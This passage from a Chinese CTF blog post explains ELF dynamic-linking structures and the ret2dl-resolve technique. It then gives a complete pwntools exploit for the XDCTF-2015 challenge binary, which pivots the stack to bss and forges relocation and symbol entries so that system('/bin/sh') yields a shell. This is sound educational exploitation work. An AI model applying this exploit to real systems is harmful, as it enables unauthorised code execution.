; DT_NULL</span><br></pre></td></tr></table></figure>
+<p><strong>.dynstr</strong></p>
+<p>.dynstr是一个字符串表，index[0]的地方永远是0，然后后面是动态链接所需的字符串，以0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C                   ; ELF String Table</span><br><span class="line">LOAD:0804821C 00                byte_804821C db 0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481EC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481FC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:0804820C↑o</span><br><span class="line">LOAD:0804821D 6C 69 62 63 2E 73+aLibcSo6 db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048227 5F 49 4F 5F 73 74+aIoStdinUsed db &apos;_IO_stdin_used&apos;,0</span><br><span class="line">LOAD:08048227 64 69 6E 5F 75 73+                              ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 70 75 74 73 00    aPuts db &apos;puts&apos;,0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B 5F 5F 6C 69 62 63+aLibcStartMain db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:0804823B 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D 47 4C 49 42 43 5F+aGlibc20 db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:08048257 5F 5F 67 6D 6F 6E+aGmonStart db &apos;__gmon_start__&apos;,0</span><br><span class="line">LOAD:08048257 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481EC↑o</span><br></pre></td></tr></table></figure>
+<p><strong>.dynsym</strong></p>
+<p>结构如下，这是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比如puts函数。结构体定义如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
+<p>在IDA中显示如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC                   ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC 00 00 00 00 00 00+Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC 1A 00 00 00 00 00+Elf32_Sym &lt;offset aPuts - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;puts&quot;</span><br><span class="line">LOAD:080481EC 3B 00 00 00 00 00+Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:080481FC 1F 00 00 00 00 00+Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804820C 0B 00 00 00 EC 84+Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, offset _IO_stdin_used, 4, 11h, 0, 10h&gt; ; &quot;_IO_stdin_used&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>.rel.plt</strong></p>
+<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info; <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+<p>在IDA中显示如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048298                   ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298 0C A0 04 08 07 01+Elf32_Rel &lt;804A00Ch, 107h&gt;    ; R_386_JMP_SLOT puts</span><br><span class="line">LOAD:080482A0 10 A0 04 08 07 03+Elf32_Rel &lt;804A010h, 307h&gt;    ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482A0 00 00             LOAD ends</span><br></pre></td></tr></table></figure>
+<p>上面的结构体看起来也挺迷糊人的，我只是根据一位大佬的文章总结过来的，下面才是我们需要清楚的关键函数 _dl_runtime_resolve(link_map_obj, reloc_index) ，源码可以在<a href="https://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">这里</a>下载。</p>
+<p>_dl_runtime_resolve函数运行模式如下：</p>
+<ol>
+<li>用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li>
+<li>.rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li>
+<li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li>
+<li>.dynstr + sym-&gt;st_name得出符号名字符串指针</li>
+<li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li>
+<li>调用这个函数</li>
+</ol>
+<p>利用方法主要是伪造rel.plt表和symtab表，并且修改reloc_index，让重定位函数解析我们伪造的结构体，借此修改符号解析的位置，对于一些字段的获取，我们可以用objdump来寻找，如下图</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .rel.plt ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 8048330 0ca00408 07010000 10a00408 07020000  ................</span><br><span class="line"> 8048340 14a00408 07040000 18a00408 07050000  ................</span><br><span class="line"> 8048350 1ca00408 07060000                    ........        </span><br><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynsym ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class="line"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class="line"> 80481f8 27000000 00000000 00000000 12000000  <span class="string">'...............</span></span><br><span class="line"><span class="string"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span></span><br><span class="line"><span class="string"> 8048218 20000000 00000000 00000000 12000000   ...............</span></span><br><span class="line"><span class="string"> 8048228 3a000000 00000000 00000000 12000000  :...............</span></span><br><span class="line"><span class="string"> 8048238 4c000000 00000000 00000000 12000000  L...............</span></span><br><span class="line"><span class="string"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span></span><br><span class="line"><span class="string"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span></span><br><span class="line"><span class="string"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span></span><br><span class="line"><span class="string">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynstr ./main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./main：     文件格式 elf32-i386</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contents of section .dynstr:</span></span><br><span class="line"><span class="string"> 8048278 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s</span></span><br><span class="line"><span class="string"> 8048288 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.</span></span><br><span class="line"><span class="string"> 8048298 7374726c 656e0072 65616400 7374646f  strlen.read.stdo</span></span><br><span class="line"><span class="string"> 80482a8 75740073 65746275 66005f5f 6c696263  ut.setbuf.__libc</span></span><br><span class="line"><span class="string"> 80482b8 5f737461 72745f6d 61696e00 77726974  _start_main.writ</span></span><br><span class="line"><span class="string"> 80482c8 65005f5f 676d6f6e 5f737461 72745f5f  e.__gmon_start__</span></span><br><span class="line"><span class="string"> 80482d8 00474c49 42435f32 2e3000             .GLIBC_2.0.</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x01：例子"><a href="#0x01：例子" class="headerlink" title="0x01：例子"></a>0x01：例子</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2dlresolve/XDCTF-2015/main" target="_blank" rel="noopener">题目链接</a></p>
+<p>首先检查保护机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ checksec main</span><br><span class="line">[*] <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/main'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p><strong>main</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+18h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to XDCTF2015~!\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>vuln</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目思路非常清晰，read函数存在栈溢出，但是没有libc，ROPgadget也很少，这里就可以考虑ret2dl-resolve，我们先将栈转移到bss段，然后构造结构体，实现对system函数的解析，然后getshell</p>
+<p>第一处payload负责栈转移，将eip覆盖为.rel.plt地址，传递一个可控的rel_offset，使rel_entry落在可控区域</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>
+<p>第二处的payload负责伪造rel_entry使sym_entry落在可控区域，伪造sym_entry使sym_name为‘system’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p32(<span class="number">0x0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">payload2 += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">payload2 += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># 返回地址</span></span><br><span class="line">payload2 += p32(bin_sh) <span class="comment"># 参数'/bin/sh'</span></span><br><span class="line">payload2 += fake_rel_plt + fake_dynsym + fake_dynstr</span><br></pre></td></tr></table></figure>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym_addr = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804a300</span> <span class="comment"># readelf -S main =&gt; .bss</span></span><br><span class="line">DYN_RESOL_PLT = <span class="number">0x8048380</span> <span class="comment"># readelf -S main =&gt; .plt</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary main --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = bss_addr</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">FAKE_REL_OFF = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_off = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">r.sendline(payload) <span class="comment"># stack immigration</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_off) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(<span class="number">0x0</span>) + p32(DYN_RESOL_PLT) + p32(FAKE_REL_OFF) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line"></span><br><span class="line">r.sendline(payload2) <span class="comment"># construct a fake structure</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x02：总结"><a href="#0x02：总结" class="headerlink" title="0x02：总结"></a>0x02：总结</h1><p>这个脚本可以保存一份，以后遇到类似的题目可以直接套用脚本</p>
+<p>参考链接：<br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ret2-resolve/" rel="tag"><i class="fa fa-tag"></i> ret2-resolve</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/05/off-by-one/" rel="next" title="off-by-one">
+                <i class="fa fa-chevron-left"></i> off-by-one
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/05/Angr-CTF符号执行/" rel="prev" title="Angr-CTF符号执行">
+                Angr-CTF符号执行 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Thunder_J</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/ThunderJie" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/thunder-j/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-compass"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://blog.csdn.net/CharlesGodX/" target="_blank" title="csdn"><i class="fa fa-fw fa-copyright"></i>csdn</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/ThunderJ17" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00：漏洞介绍"><span class="nav-number">1.</span> <span class="nav-text">0x00：漏洞介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01：例子"><span class="nav-number">2.</span> <span class="nav-text">0x01：例子</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02：总结"><span class="nav-number">3.</span> <span class="nav-text">0x02：总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright"> &copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Thunder_J</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">328k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">4:58</span>
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.2</div>
+
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:
+  <span id="busuanzi_value_site_uv"></span>
+  人
+</span>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    总访问量
+    <span id="busuanzi_value_site_pv"></span>
+    次
+</span>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
